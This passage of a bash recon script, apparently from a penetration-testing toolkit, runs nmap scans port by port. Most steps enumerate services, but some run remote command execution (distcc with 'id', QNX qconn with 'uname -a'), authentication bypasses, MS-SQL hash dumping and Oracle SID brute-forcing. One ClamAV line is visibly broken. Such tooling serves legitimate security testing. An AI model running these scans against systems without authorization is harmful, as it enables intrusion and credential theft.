     f_cleanup
     mv tmp4 $name/script-21.txt
fi

if [[ -e $name/22.txt ]]; then
     echo "     SSH"
     nmap -iL $name/22.txt -Pn -n --open -p22 --script=sshv1,ssh2-enum-algos --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-22.txt
fi

if [[ -e $name/23.txt ]]; then
     echo "     Telnet"
     nmap -iL $name/23.txt -Pn -n --open -p23 --script=banner,cics-enum,cics-user-enum,telnet-encryption,telnet-ntlm-info,tn3270-screen,tso-enum --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-23.txt
fi

if [[ -e $name/smtp.txt ]]; then
     echo "     SMTP"
     nmap -iL $name/smtp.txt -Pn -n --open -p25,465,587 --script=banner,smtp-commands,smtp-ntlm-info,smtp-open-relay,smtp-strangeport,smtp-enum-users,ssl*,tls-nextprotoneg -sV --script-args smtp-enum-users.methods={EXPN,RCPT,VRFY} --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-smtp.txt
fi

if [[ -e $name/37.txt ]]; then
     echo "     Time"
     nmap -iL $name/37.txt -Pn -n --open -p37 --script=rfc868-time --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-37.txt
fi

if [[ -e $name/53.txt ]]; then
     echo "     DNS"
     nmap -iL $name/53.txt -Pn -n -sU --open -p53 --script=dns-blacklist,dns-cache-snoop,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-update,dns-zeustracker,dns-zone-transfer --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-53.txt
fi

if [[ -e $name/67.txt ]]; then
     echo "     DHCP"
     nmap -iL $name/67.txt -Pn -n -sU --open -p67 --script=dhcp-discover --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-67.txt
fi

if [[ -e $name/70.txt ]]; then
     echo "     Gopher"
     nmap -iL $name/70.txt -Pn -n --open -p70 --script=gopher-ls --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-70.txt
fi

if [[ -e $name/79.txt ]]; then
     echo "     Finger"
     nmap -iL $name/79.txt -Pn -n --open -p79 --script=finger --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-79.txt
fi

if [[ -e $name/102.txt ]]; then
     echo "     S7"
     nmap -iL $name/102.txt -Pn -n --open -p102 --script=s7-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-102.txt
fi

if [[ -e $name/110.txt ]]; then
     echo "     POP3"
     nmap -iL $name/110.txt -Pn -n --open -p110 --script=banner,pop3-capabilities,pop3-ntlm-info,ssl*,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-110.txt
fi

if [[ -e $name/111.txt ]]; then
     echo "     RPC"
     nmap -iL $name/111.txt -Pn -n --open -p111 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-111.txt
fi

if [[ -e $name/nntp.txt ]]; then
     echo "     NNTP"
     nmap -iL $name/nntp.txt -Pn -n --open -p119,433,563 --script=nntp-ntlm-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-nntp.txt
fi

if [[ -e $name/123.txt ]]; then
     echo "     NTP"
     nmap -iL $name/123.txt -Pn -n -sU --open -p123 --script=ntp-monlist --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-123.txt
fi

if [[ -e $name/137.txt ]]; then
     echo "     NetBIOS"
     nmap -iL $name/137.txt -Pn -n -sU --open -p137 --script=nbstat --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     sed -i '/^MAC/{n; /.*/d}' tmp4		# Find lines that start with MAC, and delete the following line
     sed -i '/^137\/udp/{n; /.*/d}' tmp4	# Find lines that start with 137/udp, and delete the following line
     mv tmp4 $name/script-137.txt
fi

if [[ -e $name/139.txt ]]; then
     echo "     SMB Vulns"
     nmap -iL $name/139.txt -Pn -n --open -p139 --script=smb-vuln-conficker,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-regsvc-dos,smb-vuln-ms08-067 --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     egrep -v '(SERVICE|netbios)' tmp4 > tmp5
     sed '1N;N;/\(.*\n\)\{2\}.*VULNERABLE/P;$d;D' tmp5
     sed '/^$/d' tmp5 > tmp6
     grep -v '|' tmp6 > $name/script-smbvulns.txt
fi

if [[ -e $name/143.txt ]]; then
     echo "     IMAP"
     nmap -iL $name/143.txt -Pn -n --open -p143 --script=imap-capabilities,imap-ntlm-info,ssl*,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-143.txt
fi

if [[ -e $name/161.txt ]]; then
     echo "     SNMP"
     nmap -iL $name/161.txt -Pn -n -sU --open -p161 --script=snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-161.txt
fi

if [[ -e $name/389.txt ]]; then
     echo "     LDAP"
     nmap -iL $name/389.txt -Pn -n --open -p389 --script=ldap-rootdse,ssl*,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-389.txt
fi

if [[ -e $name/445.txt ]]; then
     echo "     SMB"
     nmap -iL $name/445.txt -Pn -n --open -p445 --script=msrpc-enum,smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-mbenum,smb-os-discovery,smb-security-mode,smb-server-stats,smb-system-info,smbv2-enabled,stuxnet-detect,smb-vuln-ms10-061 --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     sed -i '/^445/{n; /.*/d}' tmp4		# Find lines that start with 445, and delete the following line
     mv tmp4 $name/script-445.txt
fi

if [[ -e $name/500.txt ]]; then
     echo "     Ike"
     nmap -iL $name/500.txt -Pn -n -sS -sU --open -p500 --script=ike-version -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-500.txt
fi

if [[ -e $name/db2.txt ]]; then
     echo "     DB2"
     nmap -iL $name/db2.txt -Pn -n -sS -sU --open -p523 --script=db2-das-info,db2-discover --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-523.txt
fi

if [[ -e $name/524.txt ]]; then
     echo "     Novell NetWare Core Protocol"
     nmap -iL $name/524.txt -Pn -n --open -p524 --script=ncp-enum-users,ncp-serverinfo --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-524.txt
fi

if [[ -e $name/548.txt ]]; then
     echo "     AFP"
     nmap -iL $name/548.txt -Pn -n --open -p548 --script=afp-ls,afp-path-vuln,afp-serverinfo,afp-showmount --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-548.txt
fi

if [[ -e $name/554.txt ]]; then
     echo "     RTSP"
     nmap -iL $name/554.txt -Pn -n --open -p554 --script=rtsp-methods --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-554.txt
fi

if [[ -e $name/623.txt ]]; then
     echo "     IPMI"
     nmap -iL $name/623.txt -Pn -n -sU --open -p623 --script=ipmi-version,ipmi-cipher-zero --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-623.txt
fi

if [[ -e $name/631.txt ]]; then
     echo "     CUPS"
     nmap -iL $name/631.txt -Pn -n --open -p631 --script=cups-info,cups-queue-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-631.txt
fi

if [[ -e $name/636.txt ]]; then
     echo "     LDAP/S"
     nmap -iL $name/636.txt -Pn -n --open -p636 --script=ldap-rootdse,ssl*,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-636.txt
fi

if [[ -e $name/873.txt ]]; then
     echo "     rsync"
     nmap -iL $name/873.txt -Pn -n --open -p873 --script=rsync-list-modules --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-873.txt
fi

if [[ -e $name/993.txt ]]; then
     echo "     IMAP/S"
     nmap -iL $name/993.txt -Pn -n --open -p993 --script=banner,imap-capabilities,imap-ntlm-info,ssl*,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-993.txt
fi

if [[ -e $name/995.txt ]]; then
     echo "     POP3/S"
     nmap -iL $name/995.txt -Pn -n --open -p995 --script=banner,pop3-capabilities,pop3-ntlm-info,ssl*,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-995.txt
fi

if [[ -e $name/1050.txt ]]; then
     echo "     COBRA"
     nmap -iL $name/1050.txt -Pn -n --open -p1050 --script=giop-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1050.txt
fi

if [[ -e $name/1080.txt ]]; then
     echo "     SOCKS"
     nmap -iL $name/1080.txt -Pn -n --open -p1080 --script=socks-auth-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1080.txt
fi

if [[ -e $name/1099.txt ]]; then
     echo "     RMI Registry"
     nmap -iL $name/1099.txt -Pn -n --open -p1099 --script=rmi-dumpregistry --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1099.txt
fi

if [[ -e $name/1344.txt ]]; then
     echo "     ICAP"
     nmap -iL $name/1344.txt -Pn -n --open -p1344 --script=icap-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1344.txt
fi

if [[ -e $name/1352.txt ]]; then
     echo "     Lotus Domino"
     nmap -iL $name/1352.txt -Pn -n --open -p1352 --script=domino-enum-users --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1352.txt
fi

if [[ -e $name/1433.txt ]]; then
     echo "     MS-SQL"
     nmap -iL $name/1433.txt -Pn -n --open -p1433 --script=ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-info,ms-sql-ntlm-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1433.txt
fi

if [[ -e $name/1434.txt ]]; then
     echo "     MS-SQL UDP"
     nmap -iL $name/1434.txt -Pn -n -sU --open -p1434 --script=ms-sql-dac --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1434.txt
fi

if [[ -e $name/1521.txt ]]; then
     echo "     Oracle"
     nmap -iL $name/1521.txt -Pn -n --open -p1521 --script=oracle-tns-version,oracle-sid-brute --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1521.txt
fi

if [[ -e $name/1604.txt ]]; then
     echo "     Citrix"
     nmap -iL $name/1604.txt -Pn -n -sU --open -p1604 --script=citrix-enum-apps,citrix-enum-servers --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1604.txt
fi

if [[ -e $name/1723.txt ]]; then
     echo "     PPTP"
     nmap -iL $name/1723.txt -Pn -n --open -p1723 --script=pptp-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1723.txt
fi

if [[ -e $name/1883.txt ]]; then
     echo "     MQTT"
     nmap -iL $name/1883.txt -Pn -n --open -p1883 --script=mqtt-subscribe --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1883.txt
fi

if [[ -e $name/1911.txt ]]; then
     echo "     Tridium Niagara Fox"
     nmap -iL $name/1911.txt -Pn -n --open -p1911 --script=fox-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1911.txt
fi

if [[ -e $name/1962.txt ]]; then
     echo "     PCWorx"
     nmap -iL $name/1962.txt -Pn -n --open -p1962 --script=pcworx-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1962.txt
fi

if [[ -e $name/2049.txt ]]; then
     echo "     NFS"
     nmap -iL $name/2049.txt -Pn -n --open -p2049 --script=nfs-ls,nfs-showmount,nfs-statfs --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2049.txt
fi

if [[ -e $name/2202.txt ]]; then
     echo "     ACARS"
     nmap -iL $name/2202.txt -Pn -n --open -p2202 --script=acarsd-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2202.txt
fi

if [[ -e $name/2302.txt ]]; then
     echo "     Freelancer"
     nmap -iL $name/2302.txt -Pn -n -sU --open -p2302 --script=freelancer-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2302.txt
fi

if [[ -e $name/2375.txt ]]; then
     echo "     Docker"
     nmap -iL $name/2375.txt -Pn -n --open -p2375 --script=docker-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2375.txt
fi

if [[ -e $name/2628.txt ]]; then
     echo "     DICT"
     nmap -iL $name/2628.txt -Pn -n --open -p2628 --script=dict-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2628.txt
fi

if [[ -e $name/2947.txt ]]; then
     echo "     GPS"
     nmap -iL $name/2947.txt -Pn -n --open -p2947 --script=gpsd-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2947.txt
fi

if [[ -e $name/3031.txt ]]; then
     echo "     Apple Remote Event"
     nmap -iL $name/3031.txt -Pn -n --open -p3031 --script=eppc-enum-processes --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-3031.txt
fi

if [[ -e $name/3260.txt ]]; then
     echo "     iSCSI"
     nmap -iL $name/3260.txt -Pn -n --open -p3260 --script=iscsi-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-3260.txt
fi

if [[ -e $name/3306.txt ]]; then
     echo "     MySQL"
     nmap -iL $name/3306.txt -Pn -n --open -p3306 --script=mysql-databases,mysql-empty-password,mysql-info,mysql-users,mysql-variables --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-3306.txt
fi

if [[ -e $name/3310.txt ]]; then
     echo "     ClamAV"
     nmap -iL $name/3310.txt -Pn -n --open -p3310 --script=clamav-exec --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 > $name/script-3310.txt
fi

if [[ -e $name/3389.txt ]]; then
     echo "     Remote Desktop"
     nmap -iL $name/3389.txt -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     egrep -v '(attackers|Description|Disclosure|http|References|Risk factor)' tmp4 > $name/script-3389.txt
fi

if [[ -e $name/3478.txt ]]; then
     echo "     STUN"
     nmap -iL $name/3478.txt -Pn -n -sU --open -p3478 --script=stun-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-3478.txt
fi

if [[ -e $name/3632.txt ]]; then
     echo "     Distributed Compiler Daemon"
     nmap -iL $name/3632.txt -Pn -n --open -p3632 --script=distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'" --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     egrep -v '(IDs|Risk factor|Description|Allows|earlier|Disclosure|Extra|References|http)' tmp4 > $name/script-3632.txt
fi

if [[ -e $name/3671.txt ]]; then
     echo "     KNX gateway"
     nmap -iL $name/3671.txt -Pn -n -sU --open -p3671 --script=knx-gateway-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-3671.txt
fi

if [[ -e $name/4369.txt ]]; then
     echo "     Erlang Port Mapper"
     nmap -iL $name/4369.txt -Pn -n --open -p4369 --script=epmd-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-4369.txt
fi

if [[ -e $name/5019.txt ]]; then
     echo "     Versant"
     nmap -iL $name/5019.txt -Pn -n --open -p5019 --script=versant-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5019.txt
fi

if [[ -e $name/5060.txt ]]; then
     echo "     SIP"
     nmap -iL $name/5060.txt -Pn -n --open -p5060 --script=sip-enum-users,sip-methods --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5060.txt
fi

if [[ -e $name/5353.txt ]]; then
     echo "     DNS Service Discovery"
     nmap -iL $name/5353.txt -Pn -n -sU --open -p5353 --script=dns-service-discovery --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5353.txt
fi

if [[ -e $name/5666.txt ]]; then
     echo "     Nagios"
     nmap -iL $name/5666.txt -Pn -n --open -p5666 --script=nrpe-enum --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5666.txt
fi

if [[ -e $name/5672.txt ]]; then
     echo "     AMQP"
     nmap -iL $name/5672.txt -Pn -n --open -p5672 --script=amqp-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5672.txt
fi

if [[ -e $name/5683.txt ]]; then
     echo "     CoAP"
     nmap -iL $name/5683.txt -Pn -n -sU --open -p5683 --script=coap-resources --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5683.txt
fi

if [[ -e $name/5850.txt ]]; then
     echo "     OpenLookup"
     nmap -iL $name/5850.txt -Pn -n --open -p5850 --script=openlookup-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5850.txt
fi

if [[ -e $name/5900.txt ]]; then
     echo "     VNC"
     nmap -iL $name/5900.txt -Pn -n --open -p5900 --script=realvnc-auth-bypass,vnc-info,vnc-title --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5900.txt
fi

if [[ -e $name/5984.txt ]]; then
     echo "     CouchDB"
     nmap -iL $name/5984.txt -Pn -n --open -p5984 --script=couchdb-databases,couchdb-stats --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5984.txt
fi

if [[ -e $name/x11.txt ]]; then
     echo "     X11"
     nmap -iL $name/x11.txt -Pn -n --open -p6000-6005 --script=x11-access --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-x11.txt
fi

if [[ -e $name/6379.txt ]]; then
     echo "     Redis"
     nmap -iL $name/6379.txt -Pn -n --open -p6379 --script=redis-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-6379.txt
fi

if [[ -e $name/6481.txt ]]; then
     echo "     Sun Service Tags"
     nmap -iL $name/6481.txt -Pn -n -sU --open -p6481 --script=servicetags --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-6481.txt
fi

if [[ -e $name/6666.txt ]]; then
     echo "     Voldemort"
     nmap -iL $name/6666.txt -Pn -n --open -p6666 --script=voldemort-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-6666.txt
fi

if [[ -e $name/7210.txt ]]; then
     echo "     Max DB"
     nmap -iL $name/7210.txt -Pn -n --open -p7210 --script=maxdb-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-7210.txt
fi

if [[ -e $name/7634.txt ]]; then
     echo "     Hard Disk Info"
     nmap -iL $name/7634.txt -Pn -n --open -p7634 --script=hddtemp-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-7634.txt
fi

if [[ -e $name/8000.txt ]]; then
     echo "     QNX QCONN"
     nmap -iL $name/8000.txt -Pn -n --open -p8000 --script=qconn-exec --script-args=qconn-exec.timeout=60,qconn-exec.bytes=1024,qconn-exec.cmd="uname -a" --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-8000.txt
fi

if [[ -e $name/8009.txt ]]; then
     echo "     AJP"
     nmap -iL $name/8009.txt -Pn -n --open -p8009 --script=ajp-methods,ajp-request --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-8009.txt
fi

if [[ -e $name/8081.txt ]]; then
     echo "     McAfee ePO"
     nmap -iL $name/8081.txt -Pn -n --open -p8081 --script=mcafee-epo-agent --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-8081.txt
fi

if [[ -e $name/8091.txt ]]; then
     echo "     CouchBase Web Administration"
     nmap -iL $name/8091.txt -Pn -n --open -p8091 --script=membase-http-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-8091.txt
fi

if [[ -e $name/bitcoin.txt ]]; then
     echo "     Bitcoin"
     nmap -iL $name/bitcoin.txt -Pn -n --open -p8332,8333 --script=bitcoin-getaddr,bitcoin-info,bitcoinrpc-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-bitcoin.txt
fi

if [[ -e $name/9100.txt ]]; then
     echo "     Lexmark"
     nmap -iL $name/9100.txt -Pn -n --open -p9100 --script=lexmark-config --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-9100.txt
fi

if [[ -e $name/9160.txt ]]; then
     echo "     Cassandra"
     nmap -iL $name/9160.txt -Pn -n --open -p9160 --script=cassandra-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-9160.txt
fi

if [[ -e $name/9600.txt ]]; then
     echo "     FINS"
     nmap -iL $name/9600.txt -Pn -n --open -p9600 --script=omron-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-9600.txt
fi

if [[ -e $name/9999.txt ]]; then
     echo "     Java Debug Wire Protocol"
     nmap -iL $name/9999.txt -Pn -n --open -p9999 --script=jdwp-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-9999.txt
fi

if [[ -e $name/10000.txt ]]; then
     echo "     Network Data Management"
     nmap -iL $name/10000.txt -Pn -n --open -p10000 --script=ndmp-fs-info,ndmp-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-10000.txt
fi

if [[ -e $name/11211.txt ]]; then
     echo "     Memory Object Caching"
     nmap -iL $name/11211.txt -Pn -n --open -p11211 --script=memcached-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-11211.txt
fi

if [[ -e $name/12000.txt ]]; then
     echo "     CCcam"
     nmap -iL $name/12000.txt -Pn -n --open -p12000 --script=cccam-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-12000.txt
fi

if [[ -e $name/12345.txt ]]; then
     echo "     NetBus"
     nmap -iL $name/12345.txt -Pn -n --open -p12345 --script=netbus-auth-bypass,netbus-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-12345.txt
fi

if [[ -e $name/17185.txt ]]; then
     echo "     VxWorks"
     nmap -iL $name/17185.txt -Pn -n -sU --open -p17185 --script=wdb-version --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-17185.txt
fi

if [[ -e $name/19150.txt ]]; then
     echo "     GKRellM"
     nmap -iL $name/19150.txt -Pn -n --open -p19150 --script=gkrellm-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-19150.txt
fi

if [[ -e $name/27017.txt ]]; then
     echo "     MongoDB"
     nmap -iL $name/27017.txt -Pn -n --open -p27017 --script=mongodb-databases,mongodb-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-27017.txt
fi

if [[ -e $name/31337.txt ]]; then
     echo "     BackOrifice"
     nmap -iL $name/31337.txt -Pn -n -sU --open -p31337 --script=backorifice-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-31337.txt
fi

if [[ -e $name/35871.txt ]]; then
     echo "     Flume"
     nmap -iL $name/35871.txt -Pn -n --open -p35871 --script=flume-master-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-35871.txt
fi

if [[ -e $name/44818.txt ]]; then
     echo "     EtherNet/IP"
     nmap -iL $name/44818.txt -Pn -n -sU --open -p44818 --script=enip-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-44818.txt
fi

if [[ -e $name/47808.txt ]]; then
     echo "     BACNet"
     nmap -iL $name/47808.txt -Pn -n -sU --open -p47808 --script=bacnet-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-47808.txt
fi

if [[ -e $name/49152.txt ]]; then
     echo "     Supermicro"
     nmap -iL $name/49152.txt -Pn -n --open -p49152 --script=supermicro-ipmi-conf --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-49152.txt
fi

if [[ -e $name/50000.txt ]]; then
     echo "     DRDA"
     nmap -iL $name/50000.txt -Pn -n --open -p50000 --script=drda-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-50000.txt
fi

if [[ -e $name/hadoop.txt ]]; then
     echo "     Hadoop"
     nmap -iL $name/hadoop.txt -Pn -n --open -p50030,50060,50070,50075,50090 --script=hadoop-datanode-info,hadoop-jobtracker-info,hadoop-namenode-info,hadoop-secondary-namenode-info,hadoop-tasktracker-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-hadoop.txt
fi

if [[ -e $name/apache-hbase.txt ]]; then
     echo "     Apache HBase"
